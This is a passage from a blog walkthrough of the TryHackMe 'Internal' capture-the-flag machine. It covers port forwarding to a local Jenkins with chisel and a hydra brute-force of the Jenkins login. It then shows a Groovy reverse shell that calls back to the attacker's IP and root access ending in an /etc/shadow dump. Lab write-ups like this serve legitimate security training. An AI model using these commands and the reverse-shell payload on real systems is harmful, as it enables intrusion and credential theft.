aubrean+  <span style=color:#ae81ff>1612</span>  <span style=color:#ae81ff>0.0</span>  <span style=color:#ae81ff>0.0</span>      <span style=color:#ae81ff>0</span>     <span style=color:#ae81ff>0</span> ?        Z    <span style=color:#ae81ff>09</span>:<span style=color:#ae81ff>07</span>   <span style=color:#ae81ff>0</span>:<span style=color:#ae81ff>00</span> [jenkins.sh] &lt;defunct&gt;
www-data  <span style=color:#ae81ff>5586</span>  <span style=color:#ae81ff>0.0</span>  <span style=color:#ae81ff>0.0</span>  <span style=color:#ae81ff>11464</span>  <span style=color:#ae81ff>1100</span> pts/<span style=color:#ae81ff>0</span>    S+   <span style=color:#ae81ff>09</span>:<span style=color:#ae81ff>29</span>   <span style=color:#ae81ff>0</span>:<span style=color:#ae81ff>00</span> grep --color=auto aubrean
</code></pre></div><p>Let&rsquo;s see the local listening ports:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp>www-data@internal:/<span style=color:#66d9ef>var</span>/www/html/wordpress<span style=color:#960050;background-color:#1e0010>$</span> netstat -plnt
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>127.0</span>.<span style=color:#ae81ff>0.1</span>:<span style=color:#ae81ff>33897</span>         <span style=color:#ae81ff>0.0</span>.<span style=color:#ae81ff>0.0</span>:*               LISTEN      -                   
tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>127.0</span>.<span style=color:#ae81ff>0.1</span>:<span style=color:#ae81ff>3306</span>          <span style=color:#ae81ff>0.0</span>.<span style=color:#ae81ff>0.0</span>:*               LISTEN      -                   
tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>127.0</span>.<span style=color:#ae81ff>0.1</span>:<span style=color:#ae81ff>8080</span>          <span style=color:#ae81ff>0.0</span>.<span style=color:#ae81ff>0.0</span>:*               LISTEN      -                   
tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>127.0</span>.<span style=color:#ae81ff>0.53</span>:<span style=color:#ae81ff>53</span>           <span style=color:#ae81ff>0.0</span>.<span style=color:#ae81ff>0.0</span>:*               LISTEN      -                   
tcp        <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0.0</span>.<span style=color:#ae81ff>0.0</span>:<span style=color:#ae81ff>22</span>              <span style=color:#ae81ff>0.0</span>.<span style=color:#ae81ff>0.0</span>:*               LISTEN      -                   
tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::<span style=color:#ae81ff>80</span>                   :::*                    LISTEN      -                   
tcp6       <span style=color:#ae81ff>0</span>      <span style=color:#ae81ff>0</span> :::<span style=color:#ae81ff>22</span>                   :::*                    LISTEN      -                   

</code></pre></div><p>Port <code>8080</code> is listening locally, let&rsquo;s try and cURL and see the repsonse it.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp>www-data@internal:/<span style=color:#66d9ef>var</span>/www/html/wordpress<span style=color:#960050;background-color:#1e0010>$</span> curl -i http:<span style=color:#75715e>//127.0.0.1:8080
</span><span style=color:#75715e></span>HTTP/<span style=color:#ae81ff>1.1</span> <span style=color:#ae81ff>403</span> Forbidden
Date: Wed, <span style=color:#ae81ff>07</span> Apr <span style=color:#ae81ff>2021</span> <span style=color:#ae81ff>09</span>:<span style=color:#ae81ff>30</span>:<span style=color:#ae81ff>54</span> GMT
X-Content-Type-Options: nosniff
Set-Cookie: JSESSIONID.<span style=color:#ae81ff>992</span>b29b3=node01ii80j993afao35bpvwstyvpu0.node0; Path=/; HttpOnly
Expires: Thu, <span style=color:#ae81ff>01</span> Jan <span style=color:#ae81ff>1970</span> <span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>00</span>:<span style=color:#ae81ff>00</span> GMT
Content-Type: text/html;charset=utf-<span style=color:#ae81ff>8</span>
X-Hudson: <span style=color:#ae81ff>1.395</span>
X-Jenkins: <span style=color:#ae81ff>2.250</span>
X-Jenkins-Session: <span style=color:#ae81ff>56d53</span>c37
X-Hudson-CLI-Port: <span style=color:#ae81ff>50000</span>
X-Jenkins-CLI-Port: <span style=color:#ae81ff>50000</span>
X-Jenkins-CLI2-Port: <span style=color:#ae81ff>50000</span>
X-You-Are-Authenticated-As: anonymous
X-You-Are-In-Group-Disabled: JENKINS-<span style=color:#ae81ff>39402</span>: use -Dhudson.security.AccessDeniedException2.REPORT_GROUP_HEADERS=<span style=color:#66d9ef>true</span> or use /whoAmI to diagnose
X-Required-Permission: hudson.model.Hudson.Read
X-Permission-Implied-By: hudson.security.Permission.GenericRead
X-Permission-Implied-By: hudson.model.Hudson.Administer
Content-Length: <span style=color:#ae81ff>793</span>
Server: Jetty(<span style=color:#ae81ff>9.4</span>.<span style=color:#ae81ff>30.</span>v20200611)

&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=<span style=color:#960050;background-color:#1e0010>&#39;</span>refresh<span style=color:#960050;background-color:#1e0010>&#39;</span> content=<span style=color:#960050;background-color:#1e0010>&#39;</span><span style=color:#ae81ff>1</span>;url=/login?<span style=color:#66d9ef>from</span>=%<span style=color:#ae81ff>2F</span><span style=color:#960050;background-color:#1e0010>&#39;</span>/&gt;&lt;script&gt;window.location.replace(<span style=color:#960050;background-color:#1e0010>&#39;</span>/login?<span style=color:#66d9ef>from</span>=%<span style=color:#ae81ff>2F</span><span style=color:#960050;background-color:#1e0010>&#39;</span>);&lt;/script&gt;&lt;/head&gt;&lt;body style=<span style=color:#960050;background-color:#1e0010>&#39;</span>background-color:white; color:white;<span style=color:#960050;background-color:#1e0010>&#39;</span>&gt;


Authentication required
&lt;!--
You are authenticated <span style=color:#66d9ef>as</span>: anonymous
Groups that you are <span style=color:#66d9ef>in</span>:
  
Permission you need to have (but didn<span style=color:#960050;background-color:#1e0010>&#39;</span>t): hudson.model.Hudson.Read
 ... which <span style=color:#66d9ef>is</span> implied <span style=color:#66d9ef>by</span>: hudson.security.Permission.GenericRead
 ... which <span style=color:#66d9ef>is</span> implied <span style=color:#66d9ef>by</span>: hudson.model.Hudson.Administer
--&gt;

&lt;/body&gt;&lt;/html&gt;    
</code></pre></div><p>&ndash;</p><h3 id=port-forwarding-8080>Port Forwarding (8080)<a hidden class=anchor aria-hidden=true href=#port-forwarding-8080>#</a></h3><p>Interesting, let&rsquo;s try and do port forwarding utilziing <strong>chisel</strong> and access the port locally on our own attacker machine.</p><p>We can do so by doing the following on attacker/victim machines:</p><p><strong>Victim:</strong></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp>www-data@internal:/tmp<span style=color:#960050;background-color:#1e0010>$</span> ./chisel-umar0x01 server -p <span style=color:#ae81ff>47000</span> 
<span style=color:#ae81ff>2021</span>/<span style=color:#ae81ff>04</span>/<span style=color:#ae81ff>07</span> <span style=color:#ae81ff>09</span>:<span style=color:#ae81ff>34</span>:<span style=color:#ae81ff>08</span> server: Fingerprint auG3MXyqO68Dyisj38bk+g/QRvnlc/xVxcjh/ulpye4=
<span style=color:#ae81ff>2021</span>/<span style=color:#ae81ff>04</span>/<span style=color:#ae81ff>07</span> <span style=color:#ae81ff>09</span>:<span style=color:#ae81ff>34</span>:<span style=color:#ae81ff>08</span> server: Listening <span style=color:#66d9ef>on</span> http:<span style=color:#75715e>//0.0.0.0:47000
</span></code></pre></div><p><strong>Attacker:</strong></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span>(root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x)-[/<span style=color:#66d9ef>var</span>/www/html]
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> ./chisel-umar0x01 client <span style=color:#ae81ff>10.10</span>.<span style=color:#ae81ff>25.58</span>:<span style=color:#ae81ff>47000</span> <span style=color:#ae81ff>2222</span>:<span style=color:#ae81ff>127.0</span>.<span style=color:#ae81ff>0.1</span>:<span style=color:#ae81ff>8080</span>                                                                                                                                           <span style=color:#ae81ff>127</span> <span style=color:#960050;background-color:#1e0010>â¨¯</span>
<span style=color:#ae81ff>2021</span>/<span style=color:#ae81ff>04</span>/<span style=color:#ae81ff>07</span> <span style=color:#ae81ff>14</span>:<span style=color:#ae81ff>35</span>:<span style=color:#ae81ff>23</span> client: Connecting to ws:<span style=color:#75715e>//10.10.25.58:47000
</span><span style=color:#75715e></span><span style=color:#ae81ff>2021</span>/<span style=color:#ae81ff>04</span>/<span style=color:#ae81ff>07</span> <span style=color:#ae81ff>14</span>:<span style=color:#ae81ff>35</span>:<span style=color:#ae81ff>23</span> client: tun: proxy<span style=color:#960050;background-color:#1e0010>#</span><span style=color:#ae81ff>2222</span>=&gt;<span style=color:#ae81ff>8080</span>: Listening
<span style=color:#ae81ff>2021</span>/<span style=color:#ae81ff>04</span>/<span style=color:#ae81ff>07</span> <span style=color:#ae81ff>14</span>:<span style=color:#ae81ff>35</span>:<span style=color:#ae81ff>24</span> client: Connected (Latency <span style=color:#ae81ff>187.684044</span>ms)
</code></pre></div><p>&ndash;</p><p>We got the connection:</p><p><img loading=lazy src=/images/internal-thm/Pasted%20image%2020210407143622.png alt></p><p>Now, let&rsquo;s connect to the <code>localhost</code> port <code>2222</code> and see if we can access the forwarded port.</p><p>Alright, the port was hosting jenkins!</p><p><img loading=lazy src=/images/internal-thm/Pasted%20image%2020210407143723.png alt></p><p>Again the login form! :|</p><p>Let&rsquo;s run hydra for jenkins bruteforcing!</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp><span style=color:#960050;background-color:#1e0010>â”Œâ”€â”€</span>(root<span style=color:#960050;background-color:#1e0010>ðŸ’€</span>b0x)-[/mnt/hgfs/THM/Internal]
<span style=color:#960050;background-color:#1e0010>â””â”€#</span> hydra -l admin -P /usr/share/wordlists/rockyou.txt <span style=color:#ae81ff>127.0</span>.<span style=color:#ae81ff>0.1</span> -s <span style=color:#ae81ff>2222</span> http-post-form <span style=color:#960050;background-color:#1e0010>&#39;</span>/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;<span style=color:#66d9ef>from</span>=%<span style=color:#ae81ff>2F</span>&amp;Submit=Sign+<span style=color:#66d9ef>in</span>:F=Invalid<span style=color:#960050;background-color:#1e0010>&#39;</span> -I                   <span style=color:#ae81ff>130</span> <span style=color:#960050;background-color:#1e0010>â¨¯</span>
Hydra v9.<span style=color:#ae81ff>1</span> (c) <span style=color:#ae81ff>2020</span> <span style=color:#66d9ef>by</span> van Hauser/THC &amp; David Maciejak - Please <span style=color:#66d9ef>do</span> not use <span style=color:#66d9ef>in</span> military or secret service organizations, or <span style=color:#66d9ef>for</span> illegal purposes (<span style=color:#66d9ef>this</span> <span style=color:#66d9ef>is</span> non-binding, these *** ignore laws and ethics anyway).

Hydra (https:<span style=color:#75715e>//github.com/vanhauser-thc/thc-hydra) starting at 2021-04-07 15:05:14
</span><span style=color:#75715e></span><span style=color:#a6e22e>[INFO]</span> Using HTTP Proxy: http:<span style=color:#75715e>//127.0.0.1:8080
</span><span style=color:#75715e></span><span style=color:#a6e22e>[WARNING]</span> Restorefile (ignored ...) <span style=color:#66d9ef>from</span> a previous session found, to prevent overwriting, ./hydra.restore
<span style=color:#a6e22e>[DATA]</span> max <span style=color:#ae81ff>16</span> tasks per <span style=color:#ae81ff>1</span> server, overall <span style=color:#ae81ff>16</span> tasks, <span style=color:#ae81ff>14344399</span> login tries (l:<span style=color:#ae81ff>1</span>/p:<span style=color:#ae81ff>14344399</span>), ~<span style=color:#ae81ff>896525</span> tries per task
<span style=color:#a6e22e>[DATA]</span> attacking http-post-form:<span style=color:#75715e>//127.0.0.1:2222/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:F=Invalid
</span><span style=color:#75715e></span><span style=color:#a6e22e>
</span><span style=color:#a6e22e>[2222]</span>[http-post-form] host: <span style=color:#ae81ff>127.0</span>.<span style=color:#ae81ff>0.1</span>   login: admin   password: ...
<span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>1</span> target successfully completed, <span style=color:#ae81ff>1</span> valid password found
Hydra (https:<span style=color:#75715e>//github.com/vanhauser-thc/thc-hydra) finished at 2021-04-07 15:05:40
</span></code></pre></div><p>http://127.0.0.1:2222/script</p><p><code>admin:...</code></p><p>Getting code execution on Jenkins, we know that it supports groovy script execution.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp>def command = <span style=color:#e6db74>&#34;cat /etc/passwd&#34;</span>
def proc = command.execute()
proc.waitFor()
println <span style=color:#e6db74>&#34;Std Out: ${proc.in.text}&#34;</span>
</code></pre></div><p><img loading=lazy src=/images/internal-thm/Pasted%20image%2020210407151404.png alt></p><p>The above doesn&rsquo;t work due to some reason for reverse shell. We can use the following snippet from this <a href=https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76>gist</a>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp>String host=<span style=color:#e6db74>&#34;10.17.0.120&#34;</span>;
<span style=color:#66d9ef>int</span> port=<span style=color:#ae81ff>4444</span>;
String cmd=<span style=color:#e6db74>&#34;/bin/bash&#34;</span>;
Process p=<span style=color:#66d9ef>new</span> ProcessBuilder(cmd).redirectErrorStream(<span style=color:#66d9ef>true</span>).start();Socket s=<span style=color:#66d9ef>new</span> Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();<span style=color:#66d9ef>while</span>(!s.isClosed()){<span style=color:#66d9ef>while</span>(pi.available()&gt;<span style=color:#ae81ff>0</span>)so.write(pi.read());<span style=color:#66d9ef>while</span>(pe.available()&gt;<span style=color:#ae81ff>0</span>)so.write(pe.read());<span style=color:#66d9ef>while</span>(si.available()&gt;<span style=color:#ae81ff>0</span>)po.write(si.read());so.flush();po.flush();Thread.sleep(<span style=color:#ae81ff>50</span>);<span style=color:#66d9ef>try</span> {p.exitValue();<span style=color:#66d9ef>break</span>;}<span style=color:#66d9ef>catch</span> (Exception e){}};p.destroy();s.close();
</code></pre></div><p>Got shell!</p><hr><p>Enumerating the container found <code>/opt/note.txt</code>. It contained the following:</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp>jenkins@jenkins:/opt<span style=color:#960050;background-color:#1e0010>$</span> cat note.txt
cat note.txt
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them <span style=color:#66d9ef>if</span> you 
need access to the root user account.

root:...
</code></pre></div><hr><h3 id=getting-root>Getting root!<a hidden class=anchor aria-hidden=true href=#getting-root>#</a></h3><p>Now, let&rsquo;s try the following credentials as the <code>root</code> user.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-csharp data-lang=csharp>www-data@internal:/tmp<span style=color:#960050;background-color:#1e0010>$</span> su - root
Password: 
root@internal:~<span style=color:#960050;background-color:#1e0010>#</span> 
root@internal:~<span style=color:#960050;background-color:#1e0010>#</span> id
uid=<span style=color:#ae81ff>0</span>(root) gid=<span style=color:#ae81ff>0</span>(root) groups=<span style=color:#ae81ff>0</span>(root)
root@internal:~<span style=color:#960050;background-color:#1e0010>#</span> head /etc/shadow
root:...:<span style=color:#ae81ff>18477</span>:<span style=color:#ae81ff>0</span>:<span style=color:#ae81ff>99999</span>:<span style=color:#ae81ff>7</span>:::
daemon:*:<span style=color:#ae81ff>18295</span>:<span style=color:#ae81ff>0</span>:<span style=color:#ae81ff>99999</span>:<span style=color:#ae81ff>7</span>:::
</code></pre></div><p>r00t! This machine was purely based on enumeration. Hopefully, you enjoyed reading the walkthrough!</p></div><footer class=post-footer><ul class=post-tags><li><a href=https://umar0x01.sh/tags/tryhackme/>tryhackme</a></li><li><a href=https://umar0x01.sh/tags/ssh/>ssh</a></li><li><a href=https://umar0x01.sh/tags/http/>http</a></li><li><a href=https://umar0x01.sh/tags/nmap/>nmap</a></li><li><a href=https://umar0x01.sh/tags/gobuster/>gobuster</a></li><li><a href=https://umar0x01.sh/tags/wpscan/>wpscan</a></li><li><a href=https://umar0x01.sh/tags/bruteforcing/>bruteforcing</a></li><li><a href=https://umar0x01.sh/tags/rce/>rce</a></li><li><a href=https://umar0x01.sh/tags/privesc/>privesc</a></li><li><a href=https://umar0x01.sh/tags/jenkins/>jenkins</a></li><li><a href=https://umar0x01.sh/tags/groovy/>groovy</a></li></ul><nav class=paginav><a class=prev href=https://umar0x01.sh/post/bounty-hacker-thm/><span class=title>Â« Prev Page</span><br><span>TryHackMe - Bounty Hacker</span></a>
<a class=next href=https://umar0x01.sh/post/debug-thm/><span class=title>Next Page Â»</span><br><span>TryHackMe - Debug</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Internal on twitter" href="https://twitter.com/intent/tweet/?text=TryHackMe%20-%20Internal&url=https%3a%2f%2fumar0x01.sh%2fpost%2finternal-thm%2f&hashtags=tryhackme%2cssh%2chttp%2cnmap%2cgobuster%2cwpscan%2cbruteforcing%2crce%2cprivesc%2cjenkins%2cgroovy"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Internal on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fumar0x01.sh%2fpost%2finternal-thm%2f&title=TryHackMe%20-%20Internal&summary=TryHackMe%20-%20Internal&source=https%3a%2f%2fumar0x01.sh%2fpost%2finternal-thm%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Internal on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fumar0x01.sh%2fpost%2finternal-thm%2f&title=TryHackMe%20-%20Internal"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Internal on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fumar0x01.sh%2fpost%2finternal-thm%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Internal on whatsapp" href="https://api.whatsapp.com/send?text=TryHackMe%20-%20Internal%20-%20https%3a%2f%2fumar0x01.sh%2fpost%2finternal-thm%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share TryHackMe - Internal on telegram" href="https://telegram.me/share/url?text=TryHackMe%20-%20Internal&url=https%3a%2f%2fumar0x01.sh%2fpost%2finternal-thm%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></main><footer class=footer><span>&copy; 2021 <a href=https://twitter.com/syed__umar target=_blank>@syed__umar</a></span>
<span>&#183;</span>
<span>Powered by <a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>window.onload=function(){localStorage.getItem("menu-scroll-position")&&(document.getElementById('menu').scrollLeft=localStorage.getItem("menu-scroll-position"))};function menu_on_scroll(){localStorage.setItem("menu-scroll-position",document.getElementById('menu').scrollLeft)}document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script><script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script></body></html>